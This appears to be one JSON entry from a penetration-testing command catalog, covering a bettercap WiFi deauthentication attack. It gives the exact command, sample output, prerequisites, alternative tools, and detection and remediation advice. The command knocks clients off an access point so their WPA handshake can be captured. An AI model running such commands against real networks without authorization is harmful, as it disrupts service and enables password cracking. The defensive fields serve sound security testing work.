  {
    "id": "bettercap-mitm",
    "tool": "bettercap",
    "category": "wireless",
    "phase": 6,
    "os": [
      "linux"
    ],
    "command": "bettercap -iface wlan0 -eval 'wifi.recon on; wifi.deauth AA:BB:CC:DD:EE:FF'",
    "name": "WiFi Deauthentication",
    "description": "Sends deauth frames to force clients to reconnect \u2014 captures handshake on reconnection.",
    "arguments": {
      "wifi.recon on": "Start WiFi recon",
      "wifi.deauth": "Send deauth to target"
    },
    "expected_output": "[*] Deauthing client CC:DD:EE:FF:00:11\n[*] WPA handshake captured!",
    "use_case": "Force handshake capture by disconnecting clients from the AP.",
    "prerequisites": [
      "Monitor mode",
      "Target AP and client in range"
    ],
    "mitre_mapping": [
      "T1498"
    ],
    "mitre_tactic": "Impact",
    "detections": [
      "Deauth frames detected by WIDS",
      "Client disconnection events"
    ],
    "remediation": [
      "Use 802.11w (management frame protection)",
      "WIDS deployment"
    ],
    "common_mistakes": [
      "Deauthing wrong client",
      "AP has 802.11w enabled"
    ],
    "alternatives": [
      "aireplay-ng --deauth",
      "mdk4"
    ],
    "references": [
      "https://www.bettercap.org"
    ],
    "tags": [
      "deauth",
      "wifi",
      "handshake",
      "force",
      "wireless"
    ]
  },
